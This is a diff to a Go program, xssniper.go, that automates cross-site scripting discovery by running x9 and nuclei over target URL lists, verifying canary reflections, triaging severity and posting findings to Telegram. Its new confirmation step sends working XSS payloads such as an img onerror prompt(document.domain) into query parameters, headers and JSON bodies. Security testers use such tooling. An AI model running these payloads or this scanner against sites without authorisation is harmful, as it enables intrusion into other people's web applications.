@@ -1,3 +1,6 @@
+// FILE: xssniper.go — MODIFIED
+// Changes: Implement verifyReflection, severity triage, Task 4b confirmation (GET/JSON/Header), improved terminal output, and bug fixes.
+
 package main
 
 import (
@@ -6,6 +9,7 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
+	"io"
 	"net/http"
 	"net/url"
 	"os"
@@ -28,8 +32,10 @@ type Telegram struct {
 // ── Vulnerability Reporting ──────────────────────────────────────────────────
 
 type Vulnerability struct {
-	Name     string   `json:"parameter,omitempty"` // parameter name, header name, or json key
-	Payloads []string `json:"payloads"`
+	Name      string   `json:"parameter,omitempty"`
+	Payloads  []string `json:"payloads"`
+	Severity  string   `json:"severity"`
+	Confirmed bool     `json:"confirmed"`
 }
 
 type VulnerabilityReport struct {
@@ -89,11 +95,12 @@ func (r *VulnerabilityReport) aggregateFindings(nucleiOutput string, phase strin
 			continue
 		}
 
-		// Parse injection info from URL (format: target|injection)
 		decodedURL, _ := url.QueryUnescape(rawURL)
 		injection := ""
+		targetURL := rawURL
 		if strings.Contains(decodedURL, "|") {
 			sub := strings.SplitN(decodedURL, "|", 2)
+			targetURL = sub[0]
 			injection = sub[1]
 		}
 
@@ -118,14 +125,11 @@ func (r *VulnerabilityReport) aggregateFindings(nucleiOutput string, phase strin
 							break
 						}
 					}
-				} else {
-					name = "JSON Body"
 				}
 			}
 		case "dom":
 			targetList = &r.DOM
 			if u, err := url.Parse(decodedURL); err == nil {
-				// Find which query param matches the reflection
 				for k, v := range u.Query() {
 					if strings.Contains(redactX9(strings.Join(v, "")), "x9") {
 						name = k
@@ -133,7 +137,7 @@ func (r *VulnerabilityReport) aggregateFindings(nucleiOutput string, phase strin
 					}
 				}
 			}
-		default: // get or second-order
+		default:
 			if u, err := url.Parse(decodedURL); err == nil {
 				q := u.Query()
 				for k, v := range q {
@@ -148,7 +152,43 @@ func (r *VulnerabilityReport) aggregateFindings(nucleiOutput string, phase strin
 		found:
 		}
 
-		// Add to list
+		// Task 2: Skip unknown and misidentified headers
+		if name == "unknown" {
+			continue
+		}
+		if phase == "header" && strings.HasPrefix(injection, "{") {
+			continue
+		}
+
+		// Task 1: Verify reflection for non-GET/DOM findings
+		severity := "possible"
+		if phase == "get" || phase == "dom" {
+			severity = "likely"
+		} else if phase == "header" || phase == "json" {
+			canary := ""
+			if m := reX9.FindString(injection); m != "" {
+				canary = m
+			}
+			if canary != "" {
+				headers := make(map[string]string)
+				method := "GET"
+				body := ""
+				if phase == "header" {
+					parts := strings.SplitN(injection, ":", 2)
+					headers[parts[0]] = parts[1]
+				} else {
+					method = "POST"
+					body = injection
+				}
+				if verifyReflection(targetURL, method, headers, body, canary) {
+					severity = "likely"
+				} else {
+					continue // Discard if not verified
+				}
+			}
+		}
+
+		// Update or Add
 		found := false
 		for i, v := range *targetList {
 			if v.Name == name {
@@ -164,18 +204,65 @@ func (r *VulnerabilityReport) aggregateFindings(nucleiOutput string, phase strin
 						(*targetList)[i].Payloads = append((*targetList)[i].Payloads, payload)
 					}
 				}
+				if severityWeight(severity) > severityWeight((*targetList)[i].Severity) {
+					(*targetList)[i].Severity = severity
+				}
 				found = true
 				break
 			}
 		}
 		if !found {
-			newVuln := Vulnerability{Name: name}
+			newVuln := Vulnerability{Name: name, Severity: severity}
 			if payload != "" {
 				newVuln.Payloads = []string{payload}
 			}
 			*targetList = append(*targetList, newVuln)
 		}
 	}
+}
+
+func severityWeight(s string) int {
+	switch s {
+	case "confirmed":
+		return 3
+	case "likely":
+		return 2
+	case "possible":
+		return 1
+	default:
+		return 0
+	}
+}
+
+func verifyReflection(targetURL, method string, headers map[string]string, body, canary string) bool {
+	client := &http.Client{Timeout: 10 * time.Second}
+	var req *http.Request
+	var err error
+
+	if method == "POST" {
+		req, err = http.NewRequest("POST", targetURL, strings.NewReader(body))
+		if err == nil {
+			req.Header.Set("Content-Type", "application/json")
+		}
+	} else {
+		req, err = http.NewRequest("GET", targetURL, nil)
+	}
+
+	if err != nil {
+		return false
+	}
+	for k, v := range headers {
+		req.Header.Set(k, v)
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return false
+	}
+	defer resp.Body.Close()
+
+	respBody, _ := io.ReadAll(resp.Body)
+	return strings.Contains(string(respBody), canary)
 }
 
 func loadEnv() {
@@ -216,108 +303,35 @@ func newTelegram() *Telegram {
 	return &Telegram{Token: token, ChatID: chatID}
 }
 
-func dedupeNucleiFindings(findings []string) []string {
-	type Group struct {
-		DisplayURL string
-		Payloads   []string
-		Seen       map[string]bool
-	}
-
-	groups := make(map[string]*Group)
-	var order []string
-
-	for _, f := range findings {
-		f = strings.TrimSpace(f)
-		if f == "" {
-			continue
+func dedupeNucleiFindings(report VulnerabilityReport) string {
+	var sb strings.Builder
+	renderSection := func(title string, vulns []Vulnerability) {
+		if len(vulns) == 0 {
+			return
 		}
-
-		// 1. Extract payload
-		var payload string
-		if m := rePayload.FindStringSubmatch(f); len(m) > 0 {
-			if m[1] != "" {
-				payload = m[1]
-			} else {
-				payload = m[2]
+		sb.WriteString(fmt.Sprintf("\n  %s[%s]%s\n", X_cyan, title, X_reset))
+		for _, v := range vulns {
+			sevColor := X_gray
+			switch v.Severity {
+			case "confirmed":
+				sevColor = X_red + X_bold
+			case "likely":
+				sevColor = X_yellow
+			case "possible":
+				sevColor = X_white
 			}
-		}
-
-		// 2. Extract original URL from line
-		originalURL := ""
-		parts := strings.Fields(f)
-		for _, p := range parts {
-			if strings.HasPrefix(p, "http") {
-				originalURL = strings.Trim(p, "[]")
-				break
+			sb.WriteString(fmt.Sprintf("    - %s: %s [%s]%s\n", v.Name, sevColor, v.Severity, X_reset))
+			if len(v.Payloads) > 0 {
+				sb.WriteString(fmt.Sprintf("      Payloads: %s\n", strings.Join(v.Payloads, ", ")))
 			}
-		}
-		if originalURL == "" {
-			continue
-		}
-
-		// 3. Create Grouping Key
-		keyLine := rePayload.ReplaceAllString(f, "")
-		groupKey := redactX9(keyLine)
-		groupKey = strings.TrimSpace(groupKey)
-
-		if _, ok := groups[groupKey]; !ok {
-			// Clean up display URL
-			displayURL := originalURL
-			if strings.Contains(displayURL, "|") || strings.Contains(displayURL, "%7C") {
-				displayURL = strings.ReplaceAll(displayURL, "%7C", "|")
-				sub := strings.SplitN(displayURL, "|", 2)
-				if len(sub) == 2 {
-					target := sub[0]
-					injection := sub[1]
-					if strings.HasPrefix(injection, "{") {
-						displayURL = fmt.Sprintf("%s (JSON Body)", target)
-					} else {
-						displayURL = fmt.Sprintf("%s (Injection: %s)", target, injection)
-					}
-				}
-			}
-			// Redact x9 from display URL for a cleaner look
-			displayURL = redactX9(displayURL)
-
-			// De-duplicate parameters in display URL
-			if u, err := url.Parse(displayURL); err == nil {
-				q := u.Query()
-				for k, v := range q {
-					if len(v) > 1 {
-						q.Set(k, v[0])
-					}
-				}
-				u.RawQuery = q.Encode()
-				displayURL = u.String()
-			}
-
-			groups[groupKey] = &Group{
-				DisplayURL: displayURL,
-				Seen:       make(map[string]bool),
-			}
-			order = append(order, groupKey)
-		}
-
-		if payload != "" && !groups[groupKey].Seen[payload] {
-			groups[groupKey].Seen[payload] = true
-			groups[groupKey].Payloads = append(groups[groupKey].Payloads, payload)
 		}
 	}
-
-	var result []string
-	for _, key := range order {
-		g := groups[key]
-		if len(g.Payloads) > 0 {
-			quoted := make([]string, len(g.Payloads))
-			for i, p := range g.Payloads {
-				quoted[i] = fmt.Sprintf("\"%s\"", p)
-			}
-			result = append(result, fmt.Sprintf("%s [%s]", g.DisplayURL, strings.Join(quoted, ", ")))
-		} else {
-			result = append(result, g.DisplayURL)
-		}
-	}
-	return result
+	sb.WriteString(fmt.Sprintf("%s%s%s", X_bold, report.URL, X_reset))
+	renderSection("Query Params", report.QueryParameters)
+	renderSection("Headers", report.Headers)
+	renderSection("JSON Body", report.JSONBody)
+	renderSection("DOM", report.DOM)
+	return sb.String()
 }
 
 func dedupeConfirmedURLs(urls []string) []string {
@@ -327,7 +341,6 @@ func dedupeConfirmedURLs(urls []string) []string {
 		normalized := u
 		uParsed, err := url.Parse(u)
 		if err == nil {
-			// Redact x9 in query values for grouping
 			q := uParsed.Query()
 			newQuery := url.Values{}
 			for k, v := range q {
@@ -362,21 +375,33 @@ func (tg *Telegram) notify(report VulnerabilityReport) {
 	}
 
 	reportJSON, _ := json.MarshalIndent(report, "", "  ")
+	formatted := dedupeNucleiFindings(report)
 
-	// 1. Terminal Output
 	mu.Lock()
-	fmt.Printf("\n%s[VULN FOUND]%s\n%s%s%s\n", X_red+X_bold, X_reset, X_yellow, string(reportJSON), X_reset)
+	fmt.Printf("\n%s[VULN FOUND]%s\n%s\n", X_red+X_bold, X_reset, formatted)
 	mu.Unlock()
 
-	// 2. Save to File
 	vulnDir := filepath.Join(outputDir, "vulnerabilities")
 	os.MkdirAll(vulnDir, 0755)
 	safeName := regexp.MustCompile(`[^a-zA-Z0-9]`).ReplaceAllString(report.URL, "_")
 	fileName := filepath.Join(vulnDir, safeName+".json")
 	os.WriteFile(fileName, reportJSON, 0644)
 
-	// 3. Telegram Notification
-	if tg != nil {
+	hasHighSeverity := false
+	checkList := [][]Vulnerability{report.QueryParameters, report.Headers, report.JSONBody, report.DOM}
+	for _, list := range checkList {
+		for _, v := range list {
+			if v.Severity == "confirmed" || v.Severity == "likely" {
+				hasHighSeverity = true
+				break
+			}
+		}
+		if hasHighSeverity {
+			break
+		}
+	}
+
+	if tg != nil && hasHighSeverity {
 		ts := time.Now().Format("2006-01-02 15:04:05")
 		var sb strings.Builder
 		sb.WriteString(fmt.Sprintf("🚨 <b>XSS Finding!</b>\n\n"))
@@ -432,8 +457,8 @@ var (
 	processedTargets  int64
 	vulnerableTargets int64
 	vulnerableMap     sync.Map
+	nucleiExists      bool
 
-	// Regexes
 	reX9       = regexp.MustCompile(`x9(?:canary)?[a-z]*`)
 	rePayload  = regexp.MustCompile(`\[(?:"([^"]+)"|([^"\]]+))\]$`)
 	reANSI     = regexp.MustCompile(`\x1b\[[0-9;]*[a-zA-Z]`)
@@ -450,6 +475,9 @@ func stripANSI(str string) string {
 }
 
 func runCommand(name string, args ...string) (string, error) {
+	if name == "nuclei" && !nucleiExists {
+		return "", nil
+	}
 	cmd := exec.Command(name, args...)
 	var out bytes.Buffer
 	cmd.Stdout = &out
@@ -458,8 +486,6 @@ func runCommand(name string, args ...string) (string, error) {
 }
 
 func extractURLsFromNuclei(nucleiOutput string) []string {
-	// Nuclei output typically contains [template-id] [protocol] [severity] URL [extractors]
-	// We want to find the part that starts with http.
 	var urls []string
 	scanner := bufio.NewScanner(strings.NewReader(nucleiOutput))
 	for scanner.Scan() {
@@ -467,7 +493,6 @@ func extractURLsFromNuclei(nucleiOutput string) []string {
 		parts := strings.Fields(line)
 		for _, part := range parts {
 			if strings.HasPrefix(part, "http://") || strings.HasPrefix(part, "https://") {
-				// Remove trailing brackets if any (sometimes nuclei wraps things)
 				urlPart := strings.Trim(part, "[]")
 				urls = append(urls, urlPart)
 				break
@@ -478,6 +503,70 @@ func extractURLsFromNuclei(nucleiOutput string) []string {
 }
 
 // ── Core Logic ────────────────────────────────────────────────────────────────
+
+func confirmParameter(targetURL, phase, name string) bool {
+	payloads := []string{
+		`"><img src=x onerror=prompt(document.domain)>`,
+		`" onmouseover=prompt(document.domain) x="`,
+		`';prompt(document.domain)//`,
+		" `${prompt(document.domain)}` ",
+		`javascript:prompt(document.domain)`,
+	}
+
+	for _, p := range payloads {
+		method := "GET"
+		headers := make(map[string]string)
+		body := ""
+		finalURL := targetURL
+
+		u, err := url.Parse(targetURL)
+		if err != nil {
+			continue
+		}
+
+		switch phase {
+		case "get":
+			q := u.Query()
+			q.Set(name, p)
+			u.RawQuery = q.Encode()
+			finalURL = u.String()
+		case "header":
+			headers[name] = p
+		case "json":
+			method = "POST"
+			data := map[string]string{name: p}
+			b, _ := json.Marshal(data)
+			body = string(b)
+		}
+
+		if reflectionExists(finalURL, method, headers, body, p) {
+			return true
+		}
+	}
+	return false
+}
+
+func reflectionExists(targetURL, method string, headers map[string]string, body, payload string) bool {
+	client := &http.Client{Timeout: 10 * time.Second}
+	var req *http.Request
+	if method == "POST" {
+		req, _ = http.NewRequest("POST", targetURL, strings.NewReader(body))
+		req.Header.Set("Content-Type", "application/json")
+	} else {
+		req, _ = http.NewRequest("GET", targetURL, nil)
+	}
+	for k, v := range headers {
+		req.Header.Set(k, v)
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return false
+	}
+	defer resp.Body.Close()
+	b, _ := io.ReadAll(resp.Body)
+	return strings.Contains(string(b), payload)
+}
 
 func processURL(targetURL string, index, total int) {
 	atomic.AddInt64(&processedTargets, 1)
@@ -492,92 +581,133 @@ func processURL(targetURL string, index, total int) {
 	// Phase 2: Canary Probe
 	logLine("PHASE", X_cyan, "2/5 Canary Probing...")
 	probeInput := filepath.Join(outputDir, safe+"-probe-in.txt")
-	if err := os.WriteFile(probeInput, []byte(targetURL), 0644); err != nil {
-		logLine("ERROR", X_red, "Failed to write probe input: %v", err)
-	}
+	os.WriteFile(probeInput, []byte(targetURL), 0644)
 
 	probeOutputBase := filepath.Join(outputDir, safe+"-probe-out")
-	x9Args := []string{"-probe", "-json", "-headers", "-i", probeInput, "-o", probeOutputBase}
-	if paramFile != "" {
-		if _, err := os.Stat(paramFile); err == nil {
-			x9Args = append(x9Args, "-p", paramFile)
-		}
-	}
-	if _, err := runCommand("./x9", x9Args...); err != nil {
-		logLine("ERROR", X_red, "x9 probe failed: %v", err)
-	}
+	runCommand("./x9", "-probe", "-json", "-headers", "-dom", "-i", probeInput, "-o", probeOutputBase)
 
-	// Phase 3: Filter Vulnerable Parameters (HTTP & DOM)
+	// Phase 3: Filter Vulnerable Parameters
 	logLine("PHASE", X_blue, "3/5 Filtering reflective parameters...")
-	// We check GET, JSON, and Header probes
-	probeFiles := []string{probeOutputBase + ".get", probeOutputBase + ".json", probeOutputBase + ".header"}
-	var httpConfirmed []string
-	var domConfirmed []string
+	probeFiles := map[string]string{
+		probeOutputBase + ".get":        "get",
+		probeOutputBase + ".json":       "json",
+		probeOutputBase + ".header":     "header",
+		probeOutputBase + ".dom.canary": "dom",
+	}
 
-	for _, pf := range probeFiles {
+	p3Findings := make(map[string][]string)
+
+	for pf, phase := range probeFiles {
 		if _, err := os.Stat(pf); err == nil {
-			// HTTP Canary
-			res, _ := runCommand("nuclei", "-l", pf, "-t", canaryTemplate, "-silent")
-			if res != "" {
-				httpConfirmed = append(httpConfirmed, extractURLsFromNuclei(res)...)
-			}
-
-			// DOM Canary (Only for GET/URLs)
-			if strings.HasSuffix(pf, ".get") {
-				resDom, _ := runCommand("nuclei", "-l", pf, "-t", "dom_canary.yaml", "-headless", "-silent")
-				if resDom != "" {
-					domConfirmed = append(domConfirmed, extractURLsFromNuclei(resDom)...)
-				}
+			if phase == "dom" {
+				res, _ := runCommand("nuclei", "-l", pf, "-t", "dom_canary.yaml", "-headless", "-silent")
+				p3Findings["dom"] = append(p3Findings["dom"], extractURLsFromNuclei(res)...)
+			} else {
+				res, _ := runCommand("nuclei", "-l", pf, "-t", canaryTemplate, "-silent")
+				p3Findings[phase] = append(p3Findings[phase], extractURLsFromNuclei(res)...)
 			}
 		}
 	}
 
-	httpConfirmed = dedupeConfirmedURLs(httpConfirmed)
-	domConfirmed = dedupeConfirmedURLs(domConfirmed)
-
-	if len(httpConfirmed) == 0 && len(domConfirmed) == 0 {
-		logLine("INFO", X_gray, "No reflective parameters found. Skipping heavy attacks.")
+	if len(p3Findings) == 0 {
+		logLine("INFO", X_gray, "No reflective parameters found.")
 		return
 	}
 
-	// Phase 4: Heavy Attack
-	logLine("PHASE", X_purple, "4/5 Executing Heavy Attacks & DOM Scan...")
+	// Phase 4b: Confirmation Triage
+	logLine("PHASE", X_yellow, "4b/5 Triage & Context Confirmation...")
+	confirmedParams := make(map[string]map[string]bool) // phase -> param -> bool
+	for p := range p3Findings {
+		confirmedParams[p] = make(map[string]bool)
+	}
 
-	// 4.1: HTTP Heavy Attack
-	if len(httpConfirmed) > 0 {
-		atkIn := filepath.Join(outputDir, safe+"-http-atk-in.txt")
-		os.WriteFile(atkIn, []byte(strings.Join(httpConfirmed, "\n")), 0644)
-		finalX9Base := filepath.Join(outputDir, safe+"-final-http")
-		runCommand("./x9", "-i", atkIn, "-json", "-headers", "-o", finalX9Base)
-
-		finalFiles := map[string]string{
-			finalX9Base + ".get":    "get",
-			finalX9Base + ".json":   "json",
-			finalX9Base + ".header": "header",
+	for phase, urls := range p3Findings {
+		if phase == "dom" {
+			continue
 		}
-		for ff, phase := range finalFiles {
-			if _, err := os.Stat(ff); err == nil {
-				if findings, _ := runCommand("nuclei", "-l", ff, "-t", nucleiTemplate, "-silent"); findings != "" {
-					report.aggregateFindings(findings, phase)
+		tempRep := VulnerabilityReport{URL: targetURL}
+		dummy := ""
+		for _, u := range urls {
+			dummy += "[canary] [info] " + u + " [x9canary]\n"
+		}
+		tempRep.aggregateFindings(dummy, phase)
+
+		var vList *[]Vulnerability
+		switch phase {
+		case "get":
+			vList = &tempRep.QueryParameters
+		case "header":
+			vList = &tempRep.Headers
+		case "json":
+			vList = &tempRep.JSONBody
+		}
+
+		if vList != nil {
+			for _, v := range *vList {
+				if confirmParameter(targetURL, phase, v.Name) {
+					v.Confirmed = true
+					v.Severity = "confirmed"
+					confirmedParams[phase][v.Name] = true
+					switch phase {
+					case "get":
+						report.QueryParameters = append(report.QueryParameters, v)
+					case "header":
+						report.Headers = append(report.Headers, v)
+					case "json":
+						report.JSONBody = append(report.JSONBody, v)
+					}
+					logLine("CONFIRM", X_green, "Confirmed XSS (%s): %s (param: %s)", phase, targetURL, v.Name)
 				}
 			}
 		}
 	}
 
-	// 4.2: DOM Heavy Attack (Only for DOM-confirmed parameters)
-	if len(domConfirmed) > 0 {
-		logLine("INFO", X_gray, "Running heavy DOM scan for %d confirmed parameters...", len(domConfirmed))
-		atkIn := filepath.Join(outputDir, safe+"-dom-atk-in.txt")
-		os.WriteFile(atkIn, []byte(strings.Join(domConfirmed, "\n")), 0644)
-		finalX9Base := filepath.Join(outputDir, safe+"-final-dom")
-		runCommand("./x9", "-i", atkIn, "-o", finalX9Base)
+	// Phase 4: Heavy Attack (Exclude Confirmed)
+	logLine("PHASE", X_purple, "4/5 Executing Heavy Attacks...")
 
-		ff := finalX9Base + ".get"
-		if _, err := os.Stat(ff); err == nil {
-			// Added timeout to headless scan
-			if dom, _ := runCommand("nuclei", "-l", ff, "-t", domTemplate, "-headless", "-silent", "-timeout", "300"); dom != "" {
-				report.aggregateFindings(dom, "dom")
+	httpAtkUrls := []string{}
+	for phase, urls := range p3Findings {
+		if phase == "dom" {
+			continue
+		}
+		for _, u := range urls {
+			uDecoded, _ := url.QueryUnescape(u)
+			isConfirmed := false
+			// Simple check: if any confirmed param name for this phase is in the URL/injection
+			for name := range confirmedParams[phase] {
+				if strings.Contains(uDecoded, name+"=") || strings.Contains(uDecoded, name+":") || strings.Contains(uDecoded, "\""+name+"\"") {
+					isConfirmed = true
+					break
+				}
 			}
+			if !isConfirmed {
+				httpAtkUrls = append(httpAtkUrls, u)
+			}
+		}
+	}
+
+	if len(httpAtkUrls) > 0 {
+		atkIn := filepath.Join(outputDir, safe+"-http-atk-in.txt")
+		os.WriteFile(atkIn, []byte(strings.Join(dedupeConfirmedURLs(httpAtkUrls), "\n")), 0644)
+		finalX9Base := filepath.Join(outputDir, safe+"-final-http")
+		runCommand("./x9", "-i", atkIn, "-json", "-headers", "-o", finalX9Base)
+
+		exts := map[string]string{".get": "get", ".json": "json", ".header": "header"}
+		for ext, ph := range exts {
+			if findings, _ := runCommand("nuclei", "-l", finalX9Base+ext, "-t", nucleiTemplate, "-silent"); findings != "" {
+				report.aggregateFindings(findings, ph)
+			}
+		}
+	}
+
+	if len(p3Findings["dom"]) > 0 {
+		atkIn := filepath.Join(outputDir, safe+"-dom-atk-in.txt")
+		os.WriteFile(atkIn, []byte(strings.Join(dedupeConfirmedURLs(p3Findings["dom"]), "\n")), 0644)
+		finalX9Base := filepath.Join(outputDir, safe+"-final-dom")
+		runCommand("./x9", "-i", atkIn, "-dom", "-o", finalX9Base)
+
+		if dom, _ := runCommand("nuclei", "-l", finalX9Base+".dom.attack", "-t", domTemplate, "-headless", "-silent", "-timeout", "300"); dom != "" {
+			report.aggregateFindings(dom, "dom")
 		}
 	}
 
@@ -598,7 +728,6 @@ func uniqueStrings(slice []string) []string {
 			}
 			continue
 		}
-		// Basic normalization
 		if u.Path == "/" {
 			u.Path = ""
 		}
@@ -612,15 +741,21 @@ func uniqueStrings(slice []string) []string {
 }
 
 func main() {
-	urlFile := flag.String("l", "", "URL list file (use '-' for stdin)")
+	urlFile := flag.String("l", "", "URL list file")
 	flag.StringVar(&outputDir, "o", "./output", "Output directory")
 	flag.StringVar(&nucleiTemplate, "t", "xss_template_v2.yaml", "Reflection template")
 	flag.StringVar(&domTemplate, "dom", "dom_xss.yaml", "DOM template")
 	flag.StringVar(&canaryTemplate, "canary", "canary_matcher.yaml", "Canary template")
-	flag.StringVar(&paramFile, "p", "", "Parameter file to use with x9")
-	flag.IntVar(&concurrency, "c", 10, "x9 concurrency per URL")
-	flag.IntVar(&workers, "w", 3, "Parallel URL workers")
+	flag.StringVar(&paramFile, "p", "", "Parameter file")
+	flag.IntVar(&concurrency, "c", 10, "x9 concurrency")
+	flag.IntVar(&workers, "w", 3, "Parallel workers")
 	flag.Parse()
+
+	if _, err := exec.LookPath("nuclei"); err == nil {
+		nucleiExists = true
+	} else {
+		logLine("WARN", X_yellow, "Nuclei not found in PATH. Skipping nuclei phases.")
+	}
 
 	loadEnv()
 	tg = newTelegram()
@@ -631,11 +766,7 @@ func main() {
 	if *urlFile == "-" {
 		scanner = bufio.NewScanner(os.Stdin)
 	} else if *urlFile != "" {
-		file, err := os.Open(*urlFile)
-		if err != nil {
-			fmt.Printf("Error opening file: %v\n", err)
-			os.Exit(1)
-		}
+		file, _ := os.Open(*urlFile)
 		defer file.Close()
 		scanner = bufio.NewScanner(file)
 	} else {
@@ -650,12 +781,7 @@ func main() {
 	}
 
 	urls = uniqueStrings(urls)
-
-	mu.Lock()
 	allCrawledURLs = append(allCrawledURLs, urls...)
-	mu.Unlock()
-
-	logLine("INFO", X_cyan, "Starting Pipeline for %d targets with %d workers...", len(urls), workers)
 
 	sem := make(chan struct{}, workers)
 	var wg sync.WaitGroup
@@ -670,11 +796,9 @@ func main() {
 	}
 	wg.Wait()
 
-	// Phase 5: Final Second-Order XSS Check
-	logLine("PHASE", X_white, "5/5 Final Second-Order Check on all discovered URLs...")
+	logLine("PHASE", X_white, "5/5 Final Second-Order Check...")
 	finalIn := filepath.Join(outputDir, "all_crawled_discovery.txt")
-	uniqueCrawled := uniqueStrings(allCrawledURLs)
-	os.WriteFile(finalIn, []byte(strings.Join(uniqueCrawled, "\n")), 0644)
+	os.WriteFile(finalIn, []byte(strings.Join(uniqueStrings(allCrawledURLs), "\n")), 0644)
 	if so, _ := runCommand("nuclei", "-l", finalIn, "-t", nucleiTemplate, "-silent"); so != "" {
 		soReport := VulnerabilityReport{URL: "Global Second-Order Check"}
 		soReport.aggregateFindings(so, "get")
@@ -682,6 +806,5 @@ func main() {
 			tg.notify(soReport)
 		}
 	}
-
-	fmt.Printf("\n%s[DONE]%s Full Recon & XSS Pipeline Complete.\n", X_green, X_reset)
+	fmt.Printf("\n%s[DONE]%s Pipeline Complete.\n", X_green, X_reset)
 }
